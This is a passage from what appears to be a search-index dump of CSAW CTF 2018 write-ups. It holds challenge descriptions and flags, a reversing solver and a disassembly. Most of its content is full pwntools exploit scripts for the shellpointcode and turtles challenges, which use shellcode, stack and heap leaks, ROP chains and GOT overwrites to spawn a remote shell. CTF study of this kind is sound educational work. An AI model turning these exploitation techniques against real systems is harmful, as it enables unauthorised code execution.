= ELF(\"./libc.so.6\") libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./shellpointcode\" ) one_gg = 0x4f322 padding = 0 i = 0x158 else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/shellpointcode/shellpointcode\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./shellpointcode\" ) one_gg = 0xf02a4 padding = 0x10 i = 0x210 io . recvline () # gdb.attach(io, ''' # b *0x{:x} # c # '''.format( # # proc_base+0x0000000000000954, # print node # proc_base+0x00000000000008CF, # gets # # proc_base+0x0000000000000889, # gets # ) # ) shellcode0 = \" \\x90 \" * 0x10 + asm ( \"xor rax, rax\" ) + asm ( shellcraft . amd64 . sh ()) rud ( \"(15 bytes) Text for node 1:\" ) sel ( shellcode0 ) rud ( \"(15 bytes) Text for node 2:\" ) sel ( shellcode0 ) rud ( \"node.next: \" ) data = io . readline () . strip () leaked_stack = int ( data , base = 16 ) print \"[+] leaked stack: \" , hex ( leaked_stack ) rud ( \"What are your initials?\" ) shellcode1 = \"\"\"mov rax, 0x{:x} jmp [rax]\"\"\" . format ( leaked_stack - i ) # jmp [rax]\"\"\".format(leaked_stack-0x210) payload = \"A\" * 3 + \"B\" * 8 + p64 ( leaked_stack ) + asm ( shellcode1 ) sel ( payload ) io . interactive () \u5b98\u65b9\u9898\u89e3\uff1a #!/usr/bin/python from pwn import * import struct #context.log_level = 'debug' context . terminal = \"/bin/zsh\" # shellcode = \"\"\"xor eax, eax # mov rbx, 0xFF978CD091969DD1 # neg rbx # push rbx # push rsp # pop rdi # cdq # push rdx # push rdi # push rsp # pop rsi # mov al, 0x3b # syscall\"\"\".split('\\n') shellcode = \"\"\"mov rbx, 0xFF978CD091969DD1 neg rbx push rbx xor eax, eax cdq xor esi, esi push rsp pop rdi mov al, 0x3b syscall\"\"\" . split ( ' \\n ' ) def asm64 ( cmd ): return asm ( cmd , arch = 'amd64' , os = 'linux' ) def jmp ( n ): return ' \\xeb ' + struct . pack ( '<I' , 211 - 2 ) def split_code (): l = 15 - 4 b = '' nodes = [] for i in shellcode : b += asm64 ( i ) if len ( b ) >= l : b += jmp ( 16 + ( l - len ( b ))) nodes . append ( b ) b = '' return nodes if True : conn = remote ( 'pwn.chal.csaw.io' , 9005 ) #conn = process('./shellpointcode') #pause() # gdb.attach(conn) h2 , h1 = split_code () print conn . recvuntil ( ': ' ), h2 conn . sendline ( h2 ) print conn . recvuntil ( ': ' ), h1 conn . sendline ( h1 ) print conn . recvuntil ( 'next: ' ) a = conn . recvline () . strip () print a adj = int ( a , 16 ) + 40 addr = struct . pack ( '<Q' , adj ) print 'addr' , hex ( adj ), len ( addr ) print conn . recvuntil ( '?' ), addr conn . sendline ( 'A' * 11 + addr ) conn . interactive ()","title":"shellpointcode | 13\u5b57\u8282\u7684shellcode"},{"location":"CSAW-CTF-2018-Quals/pwn/shellpointcode/writeup/#shellpointcode","text":"Linked lists are great! They let you chain pieces of data together. (give shellpointcode*) (give shellpointcode.c","title":"shellpointcode"},{"location":"CSAW-CTF-2018-Quals/pwn/shellpointcode/writeup/#solution","text":"\u4e2a\u4eba\u9898\u89e3 #!/usr/bin/env python2 # coding: utf-8 from pwn import * import itertools IP = \"pwn.chal.csaw.io\" PORT = 9005 # IP = \"127.0.0.1\" # PORT = 9999 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] context . arch = \"amd64\" mode = args [ 'MODE' ] . lower () binary = \"./shellpointcode\" # for i in range(0xb8, 0x500, 8): def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) # libc = ELF(\"./libc.so.6\") libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./shellpointcode\" ) one_gg = 0x4f322 padding = 0 i = 0x158 else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/shellpointcode/shellpointcode\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./shellpointcode\" ) one_gg = 0xf02a4 padding = 0x10 i = 0x210 io . recvline () # gdb.attach(io, ''' # b *0x{:x} # c # '''.format( # # proc_base+0x0000000000000954, # print node # proc_base+0x00000000000008CF, # gets # # proc_base+0x0000000000000889, # gets # ) # ) shellcode0 = \" \\x90 \" * 0x10 + asm ( \"xor rax, rax\" ) + asm ( shellcraft . amd64 . sh ()) rud ( \"(15 bytes) Text for node 1:\" ) sel ( shellcode0 ) rud ( \"(15 bytes) Text for node 2:\" ) sel ( shellcode0 ) rud ( \"node.next: \" ) data = io . readline () . strip () leaked_stack = int ( data , base = 16 ) print \"[+] leaked stack: \" , hex ( leaked_stack ) rud ( \"What are your initials?\" ) shellcode1 = \"\"\"mov rax, 0x{:x} jmp [rax]\"\"\" . format ( leaked_stack - i ) # jmp [rax]\"\"\".format(leaked_stack-0x210) payload = \"A\" * 3 + \"B\" * 8 + p64 ( leaked_stack ) + asm ( shellcode1 ) sel ( payload ) io . interactive () \u5b98\u65b9\u9898\u89e3\uff1a #!/usr/bin/python from pwn import * import struct #context.log_level = 'debug' context . terminal = \"/bin/zsh\" # shellcode = \"\"\"xor eax, eax # mov rbx, 0xFF978CD091969DD1 # neg rbx # push rbx # push rsp # pop rdi # cdq # push rdx # push rdi # push rsp # pop rsi # mov al, 0x3b # syscall\"\"\".split('\\n') shellcode = \"\"\"mov rbx, 0xFF978CD091969DD1 neg rbx push rbx xor eax, eax cdq xor esi, esi push rsp pop rdi mov al, 0x3b syscall\"\"\" . split ( ' \\n ' ) def asm64 ( cmd ): return asm ( cmd , arch = 'amd64' , os = 'linux' ) def jmp ( n ): return ' \\xeb ' + struct . pack ( '<I' , 211 - 2 ) def split_code (): l = 15 - 4 b = '' nodes = [] for i in shellcode : b += asm64 ( i ) if len ( b ) >= l : b += jmp ( 16 + ( l - len ( b ))) nodes . append ( b ) b = '' return nodes if True : conn = remote ( 'pwn.chal.csaw.io' , 9005 ) #conn = process('./shellpointcode') #pause() # gdb.attach(conn) h2 , h1 = split_code () print conn . recvuntil ( ': ' ), h2 conn . sendline ( h2 ) print conn . recvuntil ( ': ' ), h1 conn . sendline ( h1 ) print conn . recvuntil ( 'next: ' ) a = conn . recvline () . strip () print a adj = int ( a , 16 ) + 40 addr = struct . pack ( '<Q' , adj ) print 'addr' , hex ( adj ), len ( addr ) print conn . recvuntil ( '?' ), addr conn . sendline ( 'A' * 11 + addr ) conn . interactive ()","title":"solution"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/","text":"Title \u00b6 Turtles Description \u00b6 Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them? Points \u00b6 200 Flag \u00b6 flag{i_like_turtl3$_do_u?} Setup \u00b6 Install docker and make sure port 8024 is open ./setup.sh ./run.sh Notes \u00b6 Provide them with libs folder and turtles binary Solution \u00b6 Solution is in turtles.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#title","text":"Turtles","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#description","text":"Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#points","text":"200","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#flag","text":"flag{i_like_turtl3$_do_u?}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#setup","text":"Install docker and make sure port 8024 is open ./setup.sh ./run.sh","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#notes","text":"Provide them with libs folder and turtles binary","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#solution","text":"Solution is in turtles.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/","text":"Turtles \u00b6 Description \u00b6 Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them? Points \u00b6 200 Flag \u00b6 flag{i_like_turtl3$_do_u?} Setup \u00b6 Install docker and make sure port 8024 is open ./setup.sh ./run.sh Notes \u00b6 Provide them with libs folder and turtles binary Solution \u00b6 \u4e2a\u4eba\u9898\u89e3\uff1a #!/usr/bin/env python2 # coding: utf-8 from pwn import * import itertools IP = \"pwn.chal.csaw.io\" PORT = 9003 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] context . arch = \"amd64\" mode = args [ 'MODE' ] . lower () binary = \"./turtles\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) libc = ELF ( \"./libs/libc.so.6\" ) binary = ELF ( \"./turtles\" ) one_gg = 0x4f322 padding = 0 else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/turtles/turtles\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./turtles\" ) one_gg = 0xf02a4 padding = 0x10 # io.recvline() rud ( \"Here is a Turtle: \" ) data = io . readline () . strip () leaked = int ( data , base = 16 ) print \"leaked address: \" , hex ( leaked ) gdb . attach ( io , ''' b *0x{:x} c ''' . format ( # 0x0000000000400C57, # read # 0x0000000000400C72, # memcpy # 0x0000000000400C85, # _objc_msg_lookup 0x0000000000400C9B , # call rax ) ) def calc ( target ): pass # gadget: 0x0000000000400d36 \"\"\" .text:0000000000400D36 48 83 C4 08 add rsp, 8 .text:0000000000400D3A 5B pop rbx .text:0000000000400D3B 5D pop rbp .text:0000000000400D3C 41 5C pop r12 .text:0000000000400D3E 41 5D pop r13 .text:0000000000400D40 41 5E pop r14 .text:0000000000400D42 41 5F pop r15 \"\"\" rdx_ = p64 ( 0 ) + p64 ( leaked + 0x10 + 0x48 ) + p64 ( 0x0000000000400d36 ) + \"B\" * 0x10 + \\ p64 ( 0xaa ) + p64 ( 0 ) * 2 + p64 ( leaked + 0x10 ) address_of_target_2 = p64 ( 0x0000000000400d36 ) payload = p64 ( leaked + 0x10 ) + p64 ( 0 ) + rdx_ + address_of_target_2 #+ address3 #x86_64 particular gadget, may be can be finded on any ELF64 binary general_gg1 = 0x0000000000400D36 general_gg2 = 0x0000000000400D20 def ropfunc ( function , arg1 = 0 , arg2 = 0 , arg3 = 0 ): padding = \"\" padding += p64 ( general_gg1 ) padding += \"P\" * 8 padding += p64 ( 0 ) padding += p64 ( 1 ) padding += p64 ( binary . got [ function ]) padding += p64 ( arg1 ) padding += p64 ( arg2 ) padding += p64 ( arg3 ) padding += p64 ( general_gg2 ) padding += \"P\" * 0x38 return padding rop = ROP ( \"./turtles\" ) rop . printf ( binary . got [ \"setvbuf\" ]) shellcode = rop . chain () shellcode += ropfunc ( \"read\" , 16 , binary . got [ \"setvbuf\" ], 0 ) shellcode += ropfunc ( \"setvbuf\" , 0 , 0 , binary . got [ \"setvbuf\" ] + 8 ) # as system(\"sh\") payload += shellcode sel ( payload ) pause () leaked2 = io . recvrepeat ( timeout = 2 ) leaked2 = u64 ( leaked2 . ljust ( 8 , \" \\x00 \" )) libc . address = leaked2 - libc . symbols [ \"setvbuf\" ] print \"[+] leaklib: \" , hex ( libc . address ) sel ( p64 ( libc . symbols [ \"system\" ]) + \"/bin/sh \\x00 \" ) io . interactive () \u5b98\u65b9\u9898\u89e3\uff1a # # Turtles CSAW 2018 Solution # _____ ____ # / \\ | o | # | |/ ___\\| # |_________/ # |_|_| |_|_| # from pwn import * context . log_level = \"DEBUG\" p = remote ( \"pwn.chal.csaw.io\" , 9003 ) pause () elf = ELF ( \"turtles\" ) heap_leak = int ( p . recv () . split ( \" \\n \" )[ 0 ] . split ( \": \" )[ - 1 ] . strip (), 16 ) print \"[+] Heap Leak: \" , hex ( heap_leak ) # libc offsets # magic_libc_offset: found with one_gadget (https://github.com/david942j/one_gadget) # this magic gadget is equivalent to execve(\"/bin/sh\", 0, envp) which saves us the # step of having to find/write \"/bin/sh\" into the progrma magic_libc_offset = 0x41320 printf_libc_offset = 0x50cf0 # various rop gadgets found with rp++ (https://github.com/0vercl0k/rp) # 0x00400ec3: fsave [rbp-0x16] ; add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret ; addespppppppr = 0x00400ec6 # 0x00400d5f: pop rax ; ret ; prax_r = 0x00400e5f # 0x00400d43: pop rdi ; ret ; prdi_r = 0x00400d43 # 0x00400d41: pop rsi ; pop r15 ; ret ; prsi_pr = 0x00400d41 # 0x00400cdb: pop rbp ; ret ; (1 found) prbp_r = 0x00400cdb # format string for leaking out bytes from program print_llu = \" %500s \" print_llu_int = int ( \"000a\" + \"\" . join ([ hex ( ord ( c ))[ 2 :] for c in print_llu ][:: - 1 ]), 16 ) # payload to be sent to program # we use our heap leak to setup a fake objc method cache # an attack which is described here (http://phrack.org/issues/66/4.html) # but adapted to the cache that gnustep objc dictates. objc_msg_lookup for # gnustep can be found here: # (https://github.com/gnustep/libobjc/blob/master/sendmsg.c#L275) # this does the cache lookup and is ultimately the thing being exploited # *rdi payload = p64 ( heap_leak - 0x40 + 0x8 ) # *(*rdi + 0x40) payload += p64 ( heap_leak + 0x10 ) # *(*(*rdi + 0x40)) payload += p64 ( heap_leak - 0x320 + 0x40 ) payload += p64 ( print_llu_int ) # 0x00400d3d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret ; payload += p64 ( 0x00400d3d ) payload += p64 ( heap_leak + 0x50 - ( 1 * 0x8 )) # Null for printf to return 0 bytes written payload += p64 ( 0 ) # *(*(*rdi + 0x40) + 0x28) payload += p64 ( 0xca0 ) payload += p64 ( heap_leak - 0xa8 + 0x48 ) # 0x00400d36: add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 # ; pop r15 ; ret ; payload += p64 ( 0x00400d36 ) # we construct our rop chain to: # 1) Call printf with an empty string to get rax to be 0 # 2) leak out the got address of printf using the format string \" %500s\" # 3) read our calculated libc magic address back into the printf got # 4) call the \"printf\" function, which is now pointing to code in libc # that will spawn a shell for us memcpy_ow_addr = elf . got [ 'memcpy' ] + 0x830 print_llu_addr = heap_leak + ( 24 * 0x8 ) print_null_addr = heap_leak + 0x30 rop_chain = \"\" . join ( map ( p64 , [ 0xdeadbeefcafebabe , 0x1337133713371337 , prdi_r , print_null_addr , elf . plt [ 'printf' ], # put 0 in rax prdi_r , print_llu_addr , prsi_pr , elf . got [ 'printf' ], 0 , elf . plt [ 'printf' ], # leak bytes prbp_r , memcpy_ow_addr , 0x400c43 , # 00400c43 lea rax, [rbp-0x830 {var_838}] print_llu_int , ])) payload += rop_chain p . send ( payload ) # using the leaked got address, calculate the actual address # of the magic jump printf_got_leak = u64 ( p . recv () . strip () + \" \\x00\\x00 \" ) libc_base = printf_got_leak - printf_libc_offset magic_addr = libc_base + magic_libc_offset p . send ( p64 ( magic_addr )) # wait for our shell p . interactive ()","title":"turtles | objc\u5bf9\u8c61\u6784\u9020"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#turtles","text":"","title":"Turtles"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#description","text":"Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#points","text":"200","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#flag","text":"flag{i_like_turtl3$_do_u?}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#setup","text":"Install docker and make sure port 8024 is open ./setup.sh ./run.sh","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#notes","text":"Provide them with libs folder and turtles binary","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/writeup/#solution","text":"\u4e2a\u4eba\u9898\u89e3\uff1a #!/usr/bin/env python2 # coding: utf-8 from pwn import * import itertools IP = \"pwn.chal.csaw.io\" PORT = 9003 context . log_level = 'DEBUG' context . terminal = [ 'tmux' , 'splitw' , '-h' ] context . arch = \"amd64\" mode = args [ 'MODE' ] . lower () binary = \"./turtles\" def r ( x ): return io . recv ( x ) def ru ( x ): return io . recvuntil ( x ) def rud ( x ): return io . recvuntil ( x , drop = True ) def se ( x ): return io . send ( x ) def sel ( x ): return io . sendline ( x ) def pick32 ( x ): return u32 ( x [: 4 ] . ljust ( 4 , ' \\0 ' )) def pick64 ( x ): return u64 ( x [: 8 ] . ljust ( 8 , ' \\0 ' )) if mode == \"remote\" : context . noptrace = True io = remote ( IP , PORT ) libc = ELF ( \"./libs/libc.so.6\" ) binary = ELF ( \"./turtles\" ) one_gg = 0x4f322 padding = 0 else : io = process ( binary ) proc_base = io . libs ()[ \"/home/vagrant/DongFeng/CSAW18/pwn/turtles/turtles\" ] libc_bb = io . libs ()[ '/lib/x86_64-linux-gnu/libc-2.23.so' ] libc = ELF ( \"/lib/x86_64-linux-gnu/libc-2.23.so\" ) binary = ELF ( \"./turtles\" ) one_gg = 0xf02a4 padding = 0x10 # io.recvline() rud ( \"Here is a Turtle: \" ) data = io . readline () . strip () leaked = int ( data , base = 16 ) print \"leaked address: \" , hex ( leaked ) gdb . attach ( io , ''' b *0x{:x} c ''' . format ( # 0x0000000000400C57, # read # 0x0000000000400C72, # memcpy # 0x0000000000400C85, # _objc_msg_lookup 0x0000000000400C9B , # call rax ) ) def calc ( target ): pass # gadget: 0x0000000000400d36 \"\"\" .text:0000000000400D36 48 83 C4 08 add rsp, 8 .text:0000000000400D3A 5B pop rbx .text:0000000000400D3B 5D pop rbp .text:0000000000400D3C 41 5C pop r12 .text:0000000000400D3E 41 5D pop r13 .text:0000000000400D40 41 5E pop r14 .text:0000000000400D42 41 5F pop r15 \"\"\" rdx_ = p64 ( 0 ) + p64 ( leaked + 0x10 + 0x48 ) + p64 ( 0x0000000000400d36 ) + \"B\" * 0x10 + \\ p64 ( 0xaa ) + p64 ( 0 ) * 2 + p64 ( leaked + 0x10 ) address_of_target_2 = p64 ( 0x0000000000400d36 ) payload = p64 ( leaked + 0x10 ) + p64 ( 0 ) + rdx_ + address_of_target_2 #+ address3 #x86_64 particular gadget, may be can be finded on any ELF64 binary general_gg1 = 0x0000000000400D36 general_gg2 = 0x0000000000400D20 def ropfunc ( function , arg1 = 0 , arg2 = 0 , arg3 = 0 ): padding = \"\" padding += p64 ( general_gg1 ) padding += \"P\" * 8 padding += p64 ( 0 ) padding += p64 ( 1 ) padding += p64 ( binary . got [ function ]) padding += p64 ( arg1 ) padding += p64 ( arg2 ) padding += p64 ( arg3 ) padding += p64 ( general_gg2 ) padding += \"P\" * 0x38 return padding rop = ROP ( \"./turtles\" ) rop . printf ( binary . got [ \"setvbuf\" ]) shellcode = rop . chain () shellcode += ropfunc ( \"read\" , 16 , binary . got [ \"setvbuf\" ], 0 ) shellcode += ropfunc ( \"setvbuf\" , 0 , 0 , binary . got [ \"setvbuf\" ] + 8 ) # as system(\"sh\") payload += shellcode sel ( payload ) pause () leaked2 = io . recvrepeat ( timeout = 2 ) leaked2 = u64 ( leaked2 . ljust ( 8 , \" \\x00 \" )) libc . address = leaked2 - libc . symbols [ \"setvbuf\" ] print \"[+] leaklib: \" , hex ( libc . address ) sel ( p64 ( libc . symbols [ \"system\" ]) + \"/bin/sh \\x00 \" ) io . interactive () \u5b98\u65b9\u9898\u89e3\uff1a # # Turtles CSAW 2018 Solution # _____ ____ # / \\ | o | # | |/ ___\\| # |_________/ # |_|_| |_|_| # from pwn import * context . log_level = \"DEBUG\" p = remote ( \"pwn.chal.csaw.io\" , 9003 ) pause () elf = ELF ( \"turtles\" ) heap_leak = int ( p . recv () . split ( \" \\n \" )[ 0 ] . split ( \": \" )[ - 1 ] . strip (), 16 ) print \"[+] Heap Leak: \" , hex ( heap_leak ) # libc offsets # magic_libc_offset: found with one_gadget (https://github.com/david942j/one_gadget) # this magic gadget is equivalent to execve(\"/bin/sh\", 0, envp) which saves us the # step of having to find/write \"/bin/sh\" into the progrma magic_libc_offset = 0x41320 printf_libc_offset = 0x50cf0 # various rop gadgets found with rp++ (https://github.com/0vercl0k/rp) # 0x00400ec3: fsave [rbp-0x16] ; add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret ; addespppppppr = 0x00400ec6 # 0x00400d5f: pop rax ; ret ; prax_r = 0x00400e5f # 0x00400d43: pop rdi ; ret ; prdi_r = 0x00400d43 # 0x00400d41: pop rsi ; pop r15 ; ret ; prsi_pr = 0x00400d41 # 0x00400cdb: pop rbp ; ret ; (1 found) prbp_r = 0x00400cdb # format string for leaking out bytes from program print_llu = \" %500s \" print_llu_int = int ( \"000a\" + \"\" . join ([ hex ( ord ( c ))[ 2 :] for c in print_llu ][:: - 1 ]), 16 ) # payload to be sent to program # we use our heap leak to setup a fake objc method cache # an attack which is described here (http://phrack.org/issues/66/4.html) # but adapted to the cache that gnustep objc dictates. objc_msg_lookup for # gnustep can be found here: # (https://github.com/gnustep/libobjc/blob/master/sendmsg.c#L275) # this does the cache lookup and is ultimately the thing being exploited # *rdi payload = p64 ( heap_leak - 0x40 + 0x8 ) # *(*rdi + 0x40) payload += p64 ( heap_leak + 0x10 ) # *(*(*rdi + 0x40)) payload += p64 ( heap_leak - 0x320 + 0x40 ) payload += p64 ( print_llu_int ) # 0x00400d3d: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret ; payload += p64 ( 0x00400d3d ) payload += p64 ( heap_leak + 0x50 - ( 1 * 0x8 )) # Null for printf to return 0 bytes written payload += p64 ( 0 ) # *(*(*rdi + 0x40) + 0x28) payload += p64 ( 0xca0 ) payload += p64 ( heap_leak - 0xa8 + 0x48 ) # 0x00400d36: add rsp, 0x08 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 # ; pop r15 ; ret ; payload += p64 ( 0x00400d36 ) # we construct our rop chain to: # 1) Call printf with an empty string to get rax to be 0 # 2) leak out the got address of printf using the format string \" %500s\" # 3) read our calculated libc magic address back into the printf got # 4) call the \"printf\" function, which is now pointing to code in libc # that will spawn a shell for us memcpy_ow_addr = elf . got [ 'memcpy' ] + 0x830 print_llu_addr = heap_leak + ( 24 * 0x8 ) print_null_addr = heap_leak + 0x30 rop_chain = \"\" . join ( map ( p64 , [ 0xdeadbeefcafebabe , 0x1337133713371337 , prdi_r , print_null_addr , elf . plt [ 'printf' ], # put 0 in rax prdi_r , print_llu_addr , prsi_pr , elf . got [ 'printf' ], 0 , elf . plt [ 'printf' ], # leak bytes prbp_r , memcpy_ow_addr , 0x400c43 , # 00400c43 lea rax, [rbp-0x830 {var_838}] print_llu_int , ])) payload += rop_chain p . send ( payload ) # using the leaked got address, calculate the actual address # of the magic jump printf_got_leak = u64 ( p . recv () . strip () + \" \\x00\\x00 \" ) libc_base = printf_got_leak - printf_libc_offset magic_addr = libc_base + magic_libc_offset p . send ( p64 ( magic_addr )) # wait for our shell p . interactive ()","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/rev/1337/writeup/","text":"\u7a0b\u5e8f\u7684\u533a\u6bb5\u540d\u5b57\u88ab\u4fee\u6539\u4e3aupx\uff0c\u4e2d\u95f4\u7a7f\u63d2\u4e86\u5927\u91cf\u7684\u82b1\u6307\u4ee4\u3002\u9996\u5148\u7a0b\u5e8f\u81ea\u5df1\u6ce8\u518c\u4e86\u5f02\u5e38\u5904\u7406\u51fd\u6570\uff0c\u5f02\u5e38\u5904\u7406\u51fd\u6570\u4e2d\u8fdb\u884c\u4e86flag\u7684\u6821\u9a8c\u3002 \u901a\u8fc7\u5bf9\u7a0b\u5e8f\u7684\u8f93\u5165\u4e0b\u786c\u4ef6\u8bbf\u95ee\u65ad\u7535\uff0c\u5b9a\u4f4d\u5230\u7b97\u6cd5\u6821\u9a8c\u5904 00528109 /75 0B jnz short 1337.00528116 0052810B |68 00805200 push 1337.00528000 00528110 |FF15 20506700 call dword ptr ds:[<&KERNEL32.LoadLibrar>; kernel32.LoadLibraryA 00528116 \\FF75 0C push dword ptr ss:[ebp+0xC] 00528119 FF75 08 push dword ptr ss:[ebp+0x8] 0052811C E8 FFFEFFFF call 1337.00528020 ; \u5bf9\u8f93\u5165\u8fdb\u884c\u8ba1\u7b97 00528121 8BF0 mov esi,eax 00528123 8BFA mov edi,edx 00528125 85C0 test eax,eax 00528127 75 07 jnz short 1337.00528130 00528129 A1 3C516700 mov eax,dword ptr ds:[<&USER32.SwitchDes> 0052812E FFD0 call eax 00528130 8BD7 mov edx,edi 00528132 8BC6 mov eax,esi 00528134 5F pop edi 00528135 5E pop esi 00528136 5D pop ebp 00528137 C2 0800 ret 0x8 0052811C\u5904\u7684call\u5bf9\u8f93\u5165\u8fdb\u884c\u8ba1\u7b97\uff0c\u53c2\u6570\u5982\u4e0b\uff1a 0015E8F4 33323130 |Arg1 = 33323130 0015E8F8 37363534 \\Arg2 = 37363534 \u8fd4\u56de\u503c\u5728eax\u8ddfedx\u4e2d\u3002\u7ee7\u7eed\u8ddf\u8e2aeax\u4e0eedx\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4f1a\u627e\u5230\u5bf9\u5e94\u6bd4\u8f83\u7684\u5bc6\u6587 0xbeb9e408e58575b0 0xb8f8437f04f80044 0xc227df7146b09474 \u5206\u679000528020\u5904\u7684\u7b97\u6cd5 \u8f6c\u6210python\u8868\u793a\u5982\u4e0b\uff1a def mul ( val ): # val is a 8B input chunk res = ( val >> 62 ) + pow ( 5 , val , 2 ** 64 ) - 1 return res & 0xffffffffffffffff \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a import string import itertools magic1 = 0xbeb9e408e58575b0 magic2 = 0xb8f8437f04f80044 magic3 = 0xc227df7146b09474 test = \"T3stT3St\" test_val = int ( test [:: - 1 ] . encode ( \"hex\" ), 16 ) def int_to_str ( val ): val = \"{:016x}\" . format ( val ) return val . decode ( \"hex\" )[:: - 1 ] def mul ( val ): res = ( val >> 62 ) + pow ( 5 , val , 2 ** 64 ) - 1 return res & 0xffffffffffffffff def solve ( num , lvl , magic , inputs ): # Stop. If we consumed 8B we have a solution if lvl == 8 : inputs . append ( int_to_str ( num )) return # Prepare mask mask = 0xff for i in range ( 0 , lvl ): mask = ( mask << 8 ) | 0xff # Bruteforce for c in string . printable : test_num = ord ( c ) << (( lvl ) * 8 ) | num res = mul ( test_num ) # If input byte matches, go deeper if res & mask == magic & mask : solve ( test_num , lvl + 1 , magic , inputs ) test_res = mul ( test_val ) retrotest = [] solve ( test_val & ( 1 << 62 ), 0 , test_res , retrotest ) assert test == retrotest [ 0 ] found1 = [] found2 = [] found3 = [] solve ( 0 , 0 , magic1 , found1 ) # solve(1 < 62, 0, magic1, found1) solve ( 0 , 0 , magic2 , found2 ) # solve(1 < 62, 0, magic2, found2) solve ( 0x0 , 0 , magic3 , found3 ) # solve(1 < 62, 0, magic3, found3) for flag in itertools . product ( found1 , found2 , found3 ): print \"flag{ %s }\" % ( \"\" . join ( flag )) \u6700\u7ec8\u5f97\u5230flag flag{4.\\/3ry.1337.|>45$vVp@9/}","title":1337},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-1/","text":"\u00b6 Give stage1.asm , stage2.bin , Makefile Flag in server.py (\"flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}\")","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-1/writeup/","text":"\u8ddf\u8e2a\u5230\u5bf9\u5e94\u7684\u884c\u6570\uff0c\u770b\u5bc4\u5b58\u5668\u5373\u53ef\u3002 129\uff1axor dh, dh dh=0x00 145: mov gs, dx 151: mov si, sp 168,169:mov al, 't' mov ah, 0x0e 197,199:mov al, [si] mov ah, 0x0e flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}","title":"A-Walk-Through-x86-Part-1"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-2/","text":"Open stage2 in disassembler, figure out how to jump past hlt . flag in flaggen.py","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-2/writeup/","text":"\u5728radare\u4e2d\u6253\u5f00\u4e8c\u8fdb\u5236\u6587\u4ef6 [ 0x00000000 ] > e asm . arch = x86 [ 0x00000000 ] > e asm . bits = 16 [ 0000 : 0000 ] > s 0x6000 [ 0000 : 6000 ] > pd 61 0000 : 6000 f4 hlt 0000 : 6001 e492 in al , 0x92 0000 : 6003 0 c02 or al , 2 0000 : 6005 e692 out 0x92 , al 0000 : 6007 31 c0 xor ax , ax 0000 : 6009 8 ed0 mov 